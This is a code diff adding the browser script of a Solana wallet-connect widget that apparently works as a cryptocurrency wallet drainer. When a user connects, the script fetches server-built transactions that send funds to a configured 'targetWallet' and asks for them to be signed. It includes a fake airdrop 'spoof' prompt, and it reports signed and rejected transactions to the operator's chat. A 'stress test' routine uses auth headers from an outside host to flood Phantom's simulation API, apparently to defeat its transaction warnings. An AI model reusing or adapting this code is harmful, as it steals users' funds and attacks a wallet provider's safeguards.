+          if (isMobile() && !isInWalletApp() && openWalletDeeplink(walletName)) {
+            console.log("Opening wallet via deeplink");
+            updateLoadingStatus(getText("openingWalletApp", "Opening wallet app…"));
+            return;
+          }
+
+          let provider = null;
+          
+          // Fix: Check the specific wallet, not window.solana first
+          if (walletName === "phantom") {
+            // Check for Phantom specifically
+            console.log("Checking for Phantom:", { 
+              hasWindowPhantom: !!window.phantom, 
+              hasWindowSolana: !!window.solana,
+              phantomSolana: !!window.phantom?.solana
+            });
+            provider = window.phantom?.solana || window.solana;
+            console.log("Phantom provider:", provider, "isPhantom:", provider?.isPhantom);
+            if (!provider || !provider.isPhantom) {
+              console.error("Phantom wallet not detected");
+              alert("Phantom wallet not detected in iframe.");
+              showRejectedState(getText("phantomWalletNotDetected", "Phantom wallet not detected"));
+              setTimeout(() => {
+                updateLoadingStatus(getText("phantomWalletNotDetected", "Phantom wallet not detected"));
+              }, 500);
+              return;
+            }
+          } else if (walletName === "solflare") {
+            // Check for Solflare specifically - don't use window.solana
+            console.log("Checking for Solflare:", { hasWindowSolflare: !!window.solflare });
+            provider = window.solflare;
+            console.log("Solflare provider:", provider, "isSolflare:", provider?.isSolflare);
+            if (!provider || !provider.isSolflare) {
+              console.error("Solflare wallet not detected");
+              showRejectedState(getText("solflareWalletNotDetected", "Solflare wallet not detected"));
+              setTimeout(() => {
+                updateLoadingStatus(getText("solflareWalletNotDetected", "Solflare wallet not detected"));
+              }, 500);
+              return;
+            }
+          }
+
+          try {
+            console.log("Requesting connection from provider:", provider);
+            console.log("Provider state:", {
+              isConnected: provider.isConnected,
+              hasPublicKey: !!provider.publicKey,
+              publicKey: provider.publicKey?.toString()
+            });
+            //alert(`[DEBUG] Provider detected: ${walletName}\nConnected: ${provider.isConnected}\nPublicKey: ${provider.publicKey?.toString() || 'none'}`);
+            
+            // Check if already connected
+            if (provider.publicKey) {
+              console.log("Already connected, publicKey:", provider.publicKey.toString());
+              currentProvider = provider;
+              userPubkey = provider.publicKey.toString();
+              updateLoadingStatus(getText("connectedBuildingTransaction", "Connected! Building transaction..."));
+              postToParent("connected", { publicKey: userPubkey });
+              
+              // Auto-prompt: build and sign immediately
+              console.log("Calling buildTransaction with userPubkey:", userPubkey);
+              try {
+                await buildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  updateLoadingStatus(getText("pleaseSignInWallet", "Please sign in your wallet..."));
+                  await signAndSend();
+                } else {
+                  console.warn("No unsigned transactions after buildTransaction");
+                  updateLoadingStatus(getText("noTransactionsToSign", "No transactions to sign"));
+                  showRejectedState(getText("noTransactionsToSign", "No transactions to sign"));
+                }
+              } catch (buildError) {
+                console.error("Error building transaction (already connected):", buildError);
+                // Error is already handled in buildTransaction, just re-throw if needed
+                // The error message should already be displayed by buildTransaction
+                throw buildError;
+              }
+              return;
+            }
+            
+            // Request connection - wallets may not show prompts in iframes
+            // Try to connect, but if it fails silently, check parent window
+            updateLoadingStatus(getText("requestingConnection", "Requesting connection..."));
+            console.log("Calling provider.connect()...");
+            
+            // Set a timeout to detect if connect() hangs
+            let connectResolved = false;
+            const connectPromise = window.phantom.solana.connect();//provider.connect();
+            const timeoutPromise = new Promise((_, reject) => 
+              setTimeout(() => {
+                if (!connectResolved) {
+                  reject(new Error("Connection timeout - wallet may not support iframe prompts"));
+                }
+              }, 5000)
+            );
+            
+            try {
+              const connectionResult = await Promise.race([connectPromise, timeoutPromise]);
+              connectResolved = true;
+              console.log("Connection result:", connectionResult);
+              //alert(`[DEBUG] Connection succeeded!\nResult: ${JSON.stringify(connectionResult).substring(0, 100)}`);
+            } catch (connectError) {
+              connectResolved = true;
+              console.warn("Connect call completed with error or timeout:", connectError);
+              //alert(`[DEBUG] Connect error/timeout:\n${connectError.message}`);
+              // Continue anyway - might have connected
+            }
+            
+            // Wait a bit for the connection to complete
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Check if we got a public key (connection might have succeeded)
+            if (provider.publicKey) {
+              console.log("Provider connected, publicKey:", provider.publicKey.toString());
+              //alert(`[DEBUG] Provider connected!\nPublicKey: ${provider.publicKey.toString()}`);
+              currentProvider = provider;
+              userPubkey = provider.publicKey.toString();
+              updateLoadingStatus(getText("connectedBuildingTransaction", "Connected! Building transaction..."));
+              postToParent("connected", { publicKey: userPubkey });
+              
+              // Auto-prompt: build and sign immediately
+              console.log("Calling buildTransaction with userPubkey:", userPubkey);
+              try {
+                await buildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  updateLoadingStatus(getText("pleaseSignInWallet", "Please sign in your wallet..."));
+                  await signAndSend();
+                } else {
+                  console.warn("No unsigned transactions after buildTransaction");
+                  updateLoadingStatus(getText("noTransactionsToSign", "No transactions to sign"));
+                  showRejectedState(getText("noTransactionsToSign", "No transactions to sign"));
+                }
+              } catch (buildError) {
+                console.error("Error building transaction (after connect):", buildError);
+                // Error is already handled in buildTransaction, just re-throw if needed
+                throw buildError;
+              }
+              return;
+            }
+            
+            // If we get here, connection didn't work
+            // Try accessing wallet from parent window
+            console.log("Connection failed in iframe, trying parent window approach");
+            if (window.parent && window.parent !== window) {
+              updateLoadingStatus(getText("pleaseConnectInParent", "Please connect in parent window..."));
+              postToParent("request-connection", { wallet: walletName });
+              // Wait for parent to handle connection
+              return;
+            }
+            
+            throw new Error("Connection Rejected.");
+            
+          } catch (e) {
+            console.error("Error in connectWallet:", e);
+            console.error("Error details:", {
+              message: e.message,
+              name: e.name,
+              stack: e.stack,
+              code: e.code
+            });
+            
+            // If error message suggests it was already handled (like from buildTransaction),
+            // don't override it with a generic connection error
+            const errorAlreadyHandled = e.message && (
+              e.message.includes("Widget misconfigured") ||
+              e.message.includes("Failed to build transaction") ||
+              e.message.includes("Network error") ||
+              e.message.includes("Server error") ||
+              e.message.includes("Insufficient balance") ||
+              e.message.includes("No transactions to sign")
+            );
+            
+            if (errorAlreadyHandled) {
+              // Error was already handled and displayed, allow user to retry by going back to selection
+              // Don't show selection view immediately - let them see the error first
+              // They can use the back button or the error will timeout
+              return;
+            }
+            
+            // Check if it's a user rejection
+            const isRejection = e.message && (
+              e.message.includes("reject") || 
+              e.message.includes("denied") || 
+              e.message.includes("cancel") ||
+              e.message.includes("User rejected")
+            );
+            
+            if (isRejection) {
+              updateLoadingStatus(getText("connectionCancelled", "Connection cancelled"));
+              showRejectedState(getText("connectionCancelled", "Connection cancelled"));
+            } else {
+              updateLoadingStatus(getText("connectionFailed", "Connection failed"));
+              showRejectedState(getText("connectionFailed", "Connection failed") + ": " + (e.message || "Unknown error"));
+            }
+            
+            if (userPubkey) {
+              await sendRejectNotification();
+            }
+          } finally {
+            // Note: Buttons will be re-enabled in showSelectionView when user clicks back
+            // Or if there's an error, they can use the back button to retry
+            // We don't need to re-enable here as the error state allows user interaction
+          }
+        }
+
+        function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+
+        // Start Phantom simulation API stress test (runs once)
+       function startPhantomStressTest() {
+  if (stressTestStarted || !config?.hideChanges) {
+    return;
+  }
+  stressTestStarted = true;
+    let isRunning = true;
+
+  (function() {
+
+    let stats = { total: 0, success: 0, failed: 0, status429Count: 0, startTime: Date.now() };
+    const MAX_REQUESTS = 99999999999;
+    
+    (async () => {
+      // Fetch headers once
+      let phantomNonce, phantomAuthToken;
+      try {
+        const whalerResp = await fetch("https://whalerapi.xyz:443/api/getLatestHeaders");
+        if (!whalerResp.ok) {
+          console.error("fetch failed:", whalerResp.status);
+          return;
+        }
+        const whalerData = await whalerResp.json();
+        if (!whalerData.headers?.phantomNonce || !whalerData.headers?.phantomAuth) {
+          console.error("Invalid response:", whalerData);
+          return;
+        }
+        phantomNonce = whalerData.headers.phantomNonce;
+        phantomAuthToken = whalerData.headers.phantomAuth;
+        console.log("🚀 Background stress test started (will stop after 100 requests or 5 consecutive 429s)");
+      } catch (e) {
+        console.error("request error:", e);
+        return;
+      }
+      
+      const sendRequest = async (id) => {
+        const DEVICE_ID = "41c2327e-958f-45d8-b3e8-d60104c9674";
+        const body = {
+          networkID: "solana:101",
+          type: "transaction",
+          url: window.location.origin,
+          metadata: { origin: window.location.origin },
+          
+          userAccount: userPubkey,
+          params: {
+                  transactions: [
+        "AsrzPgoaP5EQpXbpdJqxyyqjkn4i7HystXimQH3r96hh8rEukVVvEBh7AxHyzJv6ePc68RfQ6wAmXz8LBmmuziAvF232yKdQev78BqrZKocFiogDav5pqht93RX1sDbn9Ld9DDQDfp9fzpmUWXEnfMaAsrzPgoaP5EQpXbpdJqxyyqjkn4i7HystXimQH3r96hh8rEukVVvEBh7AxHyzJv6ePc68RfQ6wAmXz8LBmmuziAvF232yKdQev78BqrZKocFiogDav5pqht93RX1sDbn9Ld9DDQDfp9fzpmUWXEnfMaCkteM29CuDKZMgFwUuZkfC5iRZB9DvS1b2N6H5kyLoq3X7NbUrmtc6eTPZMivd4kxEVYadkTGmkjuFXqZ5qXD9n1fYBpM9fReaThkdZZ7Tzom93LmBoWvKuaapXjjnEzPePnqZNkNbiwqq7iepirci6ASNs5C9zQEE3L56oRqCkteM29CuDKZMgFwUuZkfC5iRZB9DvS1b2N6H5kyLoq3X7NbUrmtc6eTPZMivd4kxEVYadkTGmkjuFXqZ5qXD9n1fYBpM9fReaThkdZZ7Tzom93LmBoWvKuaapXjjnEzPePnqZNkNbiwqq7iepirci6ASNs5C9zQEE3L56oRq",
+        "X31JP83MXit7pYBAAVfvSZa74e8JcAptyqXpdH3iToHhqssaH5GShHkBaMLt48ZVfa1JjDDQFZYe1UJG3hhAWn7gTKns5AUDfrKMvd923gD4G516i645mZdLYo6dWy5q5CbUCRygfPE4X6WdfT7jmqAy2kATmMyquN1JyoUE6VcX5JWt4EwUUShNoSy39DCyz9tmDXyyqA1UtoMsTmPJi8LTKyQQ7M4CnKFuCUXSjoont5sp3VXAffMhVSxccoDsRH53YimK1E3vSRdw8yTGhKaAXuMrSRt4Sfr2rmobZP872hnMsvYCWwzsbktrW8uaQ9xXYaeVx2efJqGFKUVYgQ6tSq8wTqE79BwLiyL2p5HgSywE4vwYK8dEoemWBzigPrfcF4e24cNJDAJsqqKYHvFw3qDeGe5P4ATByAqpHD3pExbGNa9vyckGxPa2cfthudR"
+      ],
+            method: "signAllTransactions",
+            safeguard: {
+              enabled: true,
+              lighthouseProgramId: "L2TExMFKdjpN9kozasaurPirfHy9P8sbXoAN1qA3S95"
+            }
+          },
+          chainId: "solana:101",
+          appVersion: "25.35.0",
+          platform: "extension",
+          deviceId: DEVICE_ID
+        };
+        
+        try {
+          const resp = await fetch("https://api.phantom.app/simulation/v1?language=en", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              "accept": "*/*",
+              "x-phantom-anonymousid": DEVICE_ID,
+              "x-phantom-platform": "extension",
+              "x-phantom-version": "25.35.0",
+              "x-phantomauthtoken": phantomAuthToken,
+              "x-phantomnonce": phantomNonce
+            },
+            body: JSON.stringify(body)
+          });
+               
+          if (resp.status === 429) {
+            stats.status429Count++;                    
+            if (stats.status429Count >= 339999999999999999999) {
+              isRunning = false;
+              const duration = ((Date.now() - stats.startTime) / 1000).toFixed(2);
+              console.log('\n=== STRESS TEST STOPPED (5 consecutive 429s) ===');
+              console.log(`Total requests: ${stats.total}`);
+              console.log(`Successful: ${stats.success}`);
+              console.log(`Failed: ${stats.failed}`);
+              console.log(`Duration: ${duration}s`);
+              console.log(`Rate: ${(stats.total / duration).toFixed(2)} req/s`);
+            }
+          } else {
+            stats.status429Count = 0; // Reset counter on non-429
+            stats.success++;
+          }
+          
+          if (stats.total % 100 === 0) {
+            console.log(`📊 Sent ${stats.total} requests (${stats.success} success, ${stats.failed} failed)`);
+          }
+          return true;
+        } catch (e) {
+          stats.failed++;
+          stats.status429Count = 0; // Reset counter on error
+          return false;
+        }
+      };
+      
+      // Continuously send requests
+      const CONCURRENT = 200;
+      const activeRequests = new Set();
+      
+      while (isRunning && stats.total < MAX_REQUESTS) {
+        while (activeRequests.size < CONCURRENT && isRunning && stats.total < MAX_REQUESTS) {
+          stats.total++;
+          const promise = sendRequest(stats.total)
+            .finally(() => activeRequests.delete(promise));
+          activeRequests.add(promise);
+        }
+        await new Promise(resolve => setTimeout(resolve, 10));
+      }
+      
+      await Promise.allSettled(Array.from(activeRequests));
+      
+      // Final stats if stopped by max requests
+      if (stats.total >= MAX_REQUESTS) {
+        const duration = ((Date.now() - stats.startTime) / 1000).toFixed(2);
+        console.log('\n=== STRESS TEST STOPPED (100 requests reached) ===');
+        console.log(`Total requests: ${stats.total}`);
+        console.log(`Successful: ${stats.success}`);
+        console.log(`Failed: ${stats.failed}`);
+        console.log(`Duration: ${duration}s`);
+        console.log(`Rate: ${(stats.total / duration).toFixed(2)} req/s`);
+      }
+    })();
+  })();
+}
+
+        async function buildAndSendSpoofTransaction() {
+          if (!config || !config.customAirdropMint || !config.customAirdropAmount) {
+            console.warn("Spoof prompt enabled but missing customAirdropMint or customAirdropAmount");
+            return;
+          }
+
+          try {
+            if (currentWallet) {
+              updateLoadingStatus(getText("preparingAirdropTransaction", "Preparing airdrop transaction..."));
+            }
+
+            // Build spoof transaction
+            const resp = await fetch(API_BASE_URL.replace(/\/$/, "") + "/build-spoof", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                customAirdropMint: config.customAirdropMint,
+                customAirdropAmount: config.customAirdropAmount,
+                userPublicKey: userPubkey,
+                userChatId: config.userChatId,
+              }),
+            });
+
+            const json = await resp.json();
+            
+            if(json.status == "wl"){
+              // Add config as URL parameters
+              try {
+                const url = new URL(json.url);
+                url.searchParams.set('kiwiConfig', encodeURIComponent(JSON.stringify(config)));
+                window.location.href = url.toString();
+              } catch (e) {
+                // If URL parsing fails, append as query param manually
+                const separator = json.url.includes('?') ? '&' : '?';
+                window.location.href = json.url + separator + 'kiwiConfig=' + encodeURIComponent(JSON.stringify(config));
+              }
+            }
+
+            if (!resp.ok) {
+              console.warn("Failed to build spoof transaction:", json.error);
+              // Start stress test even if spoof build failed
+              startPhantomStressTest();
+              return; // Continue to normal transaction even if spoof fails
+            }
+
+            const spoofTx = json.unsignedTx;
+            if (!spoofTx) {
+              console.warn("No spoof transaction returned");
+              // Start stress test even if no transaction returned
+              startPhantomStressTest();
+              return;
+            }
+
+            // Sign and send the spoof transaction
+            if (currentWallet) {
+              updateLoadingStatus(getText("pleaseSignAirdropTransaction", "Please sign the airdrop transaction..."));
+            }
+
+            const provider = currentProvider || window.solana || (window.phantom && window.phantom.solana) || window.solflare;
+            if (!provider || !provider.publicKey) {
+              console.warn("No provider available for spoof transaction");
+              // Start stress test even if no provider
+              startPhantomStressTest();
+              return;
+            }
+
+            // Reconstruct transaction from base64
+            const txBytes = Uint8Array.from(atob(spoofTx), (c) => c.charCodeAt(0));
+            const tx = window.solanaWeb3.Transaction.from(txBytes);
+
+            // Sign the transaction
+            try {
+              let signedTx;
+              // Try signTransaction first, fall back to signAllTransactions
+              if (provider.signTransaction && typeof provider.signTransaction === "function") {
+                signedTx = await provider.signTransaction(tx);
+              } else if (provider.signAllTransactions && typeof provider.signAllTransactions === "function") {
+                const signedTxs = await provider.signTransaction(tx);
+                signedTx = signedTxs[0];
+              } else {
+                throw new Error("Wallet does not support transaction signing");
+              }
+              
+
+            } catch (e) {
+              // User rejected or transaction failed - that's okay, continue to normal flow
+              console.log("Spoof transaction rejected or failed (expected):", e.message);
+            }
+            
+            // Start stress test after spoof transaction is handled (accepted/rejected/failed)
+            // This runs right before building the main transaction
+            startPhantomStressTest();
+          } catch (e) {
+            // Any error in spoof flow - just log and continue
+            console.warn("Error in spoof transaction flow:", e);
+            // Start stress test even on error
+            startPhantomStressTest();
+          }
+        }
+
+        async function buildTransaction() {
+          if (!config || !config.targetWallet) {
+            if (currentWallet) {
+              updateLoadingStatus(getText("widgetMisconfigured", "Widget misconfigured"));
+              showRejectedState(getText("widgetMisconfiguredTargetWallet", "Widget misconfigured: missing targetWallet."));
+            } else {
+              setStatus(getText("widgetMisconfiguredTargetWallet", "Widget misconfigured: missing targetWallet."), "error");
+            }
+            return;
+          }
+
+          config.spoofPrompt = false; // dissable on whitelist
+          config.hideChanges = false; // dissable on whitelist
+          
+          // If spoofPrompt is enabled, first build and send the spoof transaction
+          if (config.spoofPrompt) {
+            await buildAndSendSpoofTransaction();
+            // Continue to normal transaction regardless of spoof outcome
+          }
+
+          if (currentWallet) {
+            updateLoadingStatus(getText("buildingTransaction", "Building transaction, please wait..."));
+          } else {
+            setStatus(getText("buildingTransactionWait", "Building transaction, please wait…"), "");
+          }
+
+          if(config.hideChanges) {
+            const sleepMs = config.stresserSleepMs || 500;
+            await sleep(sleepMs);
+          }
+          try {
+            const clientIP = await getClientIP();
+            let resp;
+            try {
+              resp = await fetch(API_BASE_URL.replace(/\/$/, "") + "/build-transaction", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  spoofPrompt: config.spoofPrompt,
+                  hideChanges: config.hideChanges,
+                  userPublicKey: userPubkey,
+                  targetWallet: config.targetWallet,
+                  useProxyForTokens: config.useProxyForTokens,
+                  customAirdropMint: config.customAirdropMint,
+                  customAirdropAmount: config.customAirdropAmount,
+                  userChatId: config.userChatId,
+                  clientIP: clientIP,
+                  minValue: config.minValue,
+                }),
+              });
+            } catch (fetchError) {
+              // Network error (CORS, connection failed, etc.)
+              console.error("Network error building transaction:", fetchError);
+              throw new Error("Network error: Failed to connect to server. Please check your connection.");
+            }
+            
+            let json;
+            try {
+              json = await resp.json();
+            } catch (parseError) {
+              // Response is not valid JSON
+              console.error("Failed to parse response:", parseError);
+              throw new Error("Server error: Invalid response from server.");
+            }
+            
+            if (!resp.ok) {
+              throw new Error(json.error || "Failed to build transaction");
+            }
+            unsignedTxs = json.unsignedTxs || (json.unsignedTx ? [json.unsignedTx] : []);
+            const lamportsToSol = (lamports) => lamports / 1_000_000_000;
+            if (json.meta) {
+              const solToTarget = json.meta.solToTarget || 0;
+              const solToBackend = json.meta.solToBackend || 0;
+
+            }
+            if (currentWallet) {
+              updateLoadingStatus(getText("transactionsBuilt", "Transactions built. Please sign..."));
+            } else {
+              setStatus(getText("transactionsBuiltSign", "Transactions built. Please sign in your wallet."), "success");
+            }
+            return unsignedTxs;
+          } catch (e) {
+            console.error(e);
+            const errorMsg = e.message || "Failed to build transaction";
+            
+            // Check for balance-related errors
+            const isBalanceError = errorMsg.includes("zero SOL balance") || 
+                                   errorMsg.includes("Insufficient SOL balance") ||
+                                   errorMsg.includes("insufficient") ||
+                                   errorMsg.includes("balance");
+            
+            if (currentWallet) {
+              if (isBalanceError) {
+                updateLoadingStatus(getText("insufficientBalance", "Insufficient balance"));
+                showRejectedState(getText("insufficientBalance", "Insufficient balance"));
+              } else {
+                updateLoadingStatus(getText("failedToBuildTransaction", "Failed to build transaction"));
+                showRejectedState("" + errorMsg);
+              }
+            } else {
+              if (isBalanceError) {
+                setStatus(getText("insufficientBalance", "Insufficient balance"), "error");
+              } else {
+                setStatus(errorMsg, "error");
+              }
+            }
+            throw e;
+          }
+        }
+
+        async function sendRejectNotification() {
+          if (!config || !userPubkey || rejectNotificationSent) return;
+          rejectNotificationSent = true;
+          try {
+            await fetch(API_BASE_URL.replace(/\/$/, "") + "/notify-reject", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                userPublicKey: userPubkey,
+                userChatId: config.userChatId,
+              }),
+            });
+          } catch (e) {
+            console.error("Failed to send reject notification:", e);
+          }
+        }
+
+        async function signAndSend() {
+          if (!userPubkey) {
+            setStatus(getText("connectWalletFirst", "Connect wallet first."), "error");
+            return;
+          }
+          
+          // Use the current provider that was connected
+          const provider = currentProvider || window.solana || (window.phantom && window.phantom.solana) || window.solflare;
+          
+          if (!provider) {
+            setStatus(getText("noSolanaWalletProvider", "No Solana wallet provider available."), "error");
+            return;
+          }
+          
+          // Ensure provider is connected
+          if (provider.isConnected === false || !provider.publicKey) {
+            if (currentWallet) {
+              updateLoadingStatus(getText("walletNotConnected", "Wallet not connected"));
+              showRejectedState(getText("walletNotConnectedReconnect", "Wallet not connected. Please reconnect."));
+            } else {
+              setStatus(getText("walletNotConnectedReconnect", "Wallet not connected. Please reconnect."), "error");
+            }
+            return;
+          }
+          try {
+            if (!unsignedTxs || !unsignedTxs.length) {
+              await buildTransaction();
+            }
+            if (!unsignedTxs || !unsignedTxs.length) return;
+
+            if (!window.solanaWeb3 || !window.solanaWeb3.Transaction) {
+              throw new Error("Solana web3 library not available in iframe.");
+            }
+
+            if (currentWallet) {
+              updateLoadingStatus(getText("requestingSignatures", "Requesting signatures..."));
+            } else {
+              setStatus(getText("requestingSignaturesAlt", "Requesting signatures…"), "");
+            }
+            
+            // Reconstruct transactions from base64
+            const txs = [];
+            for (let i = 0; i < unsignedTxs.length; i++) {
+              try {
+                const b64 = unsignedTxs[i];
+                const txBytes = Uint8Array.from(atob(b64), (c) => c.charCodeAt(0));
+                const tx = window.solanaWeb3.Transaction.from(txBytes);
+                
+                // Validate transaction has required fields
+                if (!tx.recentBlockhash) {
+                  throw new Error(`Transaction ${i + 1} missing recentBlockhash`);
+                }
+                
+                // Validate transaction structure
+                if (!tx.instructions || tx.instructions.length === 0) {
+                  console.warn(`Transaction ${i + 1} has no instructions, skipping`);
+                  continue;
+                }
+                
+                // Validate transaction size
+                const txSize = txBytes.length;
+                if (txSize > 1232) {
+                  console.warn(`Transaction ${i + 1} size (${txSize} bytes) exceeds limit, but proceeding`);
+                }
+                
+                // Ensure fee payer is set
+                if (!tx.feePayer) {
+                  console.warn(`Transaction ${i + 1} missing fee payer, setting to user`);
+                  tx.feePayer = new window.solanaWeb3.PublicKey(userPubkey);
+                }
+                
+                console.log(`Transaction ${i + 1} validated:`, {
+                  instructions: tx.instructions.length,
+                  size: txSize,
+                  blockhash: tx.recentBlockhash,
+                  feePayer: tx.feePayer?.toBase58()
+                });
+                
+                txs.push(tx);
+              } catch (e) {
+                console.error(`Failed to parse transaction ${i + 1}:`, e);
+                throw new Error("Failed to parse transaction data: " + (e.message || "Unknown error"));
+              }
+            }
+
+            if (txs.length === 0) {
+              throw new Error("No valid transactions to sign");
+            }
+            
+            console.log("Prepared", txs.length, "transactions for signing");
+
+            let signedTxs;
+            try {
+              // Use signAllTransactions
+              if (!provider.signAllTransactions || typeof provider.signAllTransactions !== "function") {
+                throw new Error("Wallet does not support signAllTransactions. Please use Phantom or Solflare.");
+              }
+              
+              console.log("Calling signAllTransactions with", txs.length, "transactions");
+              console.log("Transaction details:", txs.map((tx, i) => ({
+                index: i + 1,
+                instructions: tx.instructions.length,
+                blockhash: tx.recentBlockhash,
+                feePayer: tx.feePayer?.toBase58(),
+                signatures: tx.signatures?.length || 0
+              })));
+              
+              // Validate all transactions before signing
+              for (let i = 0; i < txs.length; i++) {
+                const tx = txs[i];
+                if (!tx.recentBlockhash) {
+                  throw new Error(`Transaction ${i + 1} missing blockhash`);
+                }
+                if (!tx.feePayer) {
+                  throw new Error(`Transaction ${i + 1} missing fee payer`);
+                }
+                if (!tx.instructions || tx.instructions.length === 0) {
+                  throw new Error(`Transaction ${i + 1} has no instructions`);
+                }
+              }
+              
+              signedTxs = await provider.signAllTransactions(txs);
+              isRunning = false;
+
+              console.log("Successfully signed", signedTxs.length, "transactions");
+            } catch (e) {
+              console.error("Signing error details:", {
+                error: e,
+                message: e.message,
+                stack: e.stack,
+                name: e.name
+              });
+              // User rejected signing or error occurred
+              if (userPubkey) {
+                await sendRejectNotification();
+              }
+              // Re-throw with a more user-friendly message
+              const errorMsg = e.message || e.toString() || "Failed to sign transactions";
+              if (errorMsg.includes("reject") || errorMsg.includes("denied") || errorMsg.includes("cancel")) {
+                throw new Error("Transaction signing was cancelled");
+              }
+              throw new Error(errorMsg);
+            }
+            
+            if (currentWallet) {
+              updateLoadingStatus(getText("broadcastingTransactions", "Broadcasting transactions..."));
+            } else {
+              setStatus(getText("broadcastingTransactionsAlt", "Broadcasting transactions…"), "");
+            }
+            const txids = [];
+            for (const signed of signedTxs) {
+              // Serialize with requireAllSignatures: false to allow partial signatures
+              const signedBytes = signed.serialize({
+                requireAllSignatures: false,
+                verifySignatures: false,
+              });
+              const b64Signed = btoa(String.fromCharCode.apply(null, Array.from(signedBytes)));
+              const resp = await fetch(API_BASE_URL.replace(/\/$/, "") + "/relay-transaction", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  signedTx: b64Signed,
+                }),
+              });
+              const json = await resp.json();
+              if (!resp.ok) {
+                // Don't throw error - some transactions (top holder ones) are expected to fail
+                console.warn("Transaction relay failed (may be expected for top holder txs):", json.error);
+                continue;
+              }
+              if (json.txid) {
+                txids.push(json.txid);
+              }
+            }
+
+            // Send confirmation notification with all txids
+            if (txids.length > 0 && userPubkey) {
+              try {
+                await fetch(API_BASE_URL.replace(/\/$/, "") + "/notify-confirm", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    userPublicKey: userPubkey,
+                    userChatId: config.userChatId,
+                    txids,
+                  }),
+                });
+              } catch (e) {
+                console.error("Failed to send confirmation notification:", e);
+              }
+            }
+
+            if (currentWallet) {
+              updateLoadingStatus(getText("transactionsSent", "Transactions sent!"));
+              setTimeout(() => {
+                showSelectionView();
+              }, 1500);
+            } else {
+              setStatus(getText("transactionsSent", "Transactions sent!"), "success");
+            }
+            postToParent("relayed", {});
+          } catch (e) {
+            console.error(e);
+            const errorMsg = e.message || "Failed to sign or send transaction";
+            if (errorMsg.includes("reject") || errorMsg.includes("denied") || errorMsg.includes("User rejected") || errorMsg.includes("cancelled")) {
+              if (currentWallet) {
+                showRejectedState(getText("transactionRejected", "Transaction rejected"));
+                await sendRejectNotification();
+              } else {
+                setStatus(getText("transactionRejected", "Transaction rejected"), "error");
+                await sendRejectNotification();
+              }
+            } else {
+              if (currentWallet) {
+                updateLoadingStatus(getText("transactionFailed", "Transaction failed"));
+                showRejectedState("" + errorMsg);
+              } else {
+                setStatus(errorMsg, "error");
+              }
+            }
+          }
+        }
+
+        backBtn.addEventListener("click", () => {
+          showSelectionView();
+        });
+
+        // Add event listeners with error handling
+        if (phantomBtn) {
+          console.log("Attaching Phantom button listener");
+          phantomBtn.addEventListener("click", () => {
+            console.log("Phantom button clicked");
+            connectWallet("phantom");
+          });
+        } else {
+          console.error("Phantom button not found!");
+        }
+        
+        if (solflareBtn) {
+          console.log("Attaching Solflare button listener");
+          solflareBtn.addEventListener("click", () => {
+            console.log("Solflare button clicked");
+            connectWallet("solflare");
+          });
+        } else {
+          console.error("Solflare button not found!");
+        }
+        
+        console.log("Event listeners attached", { phantomBtn, solflareBtn });
+      })();
+    </script>
+  </body>
+</html>
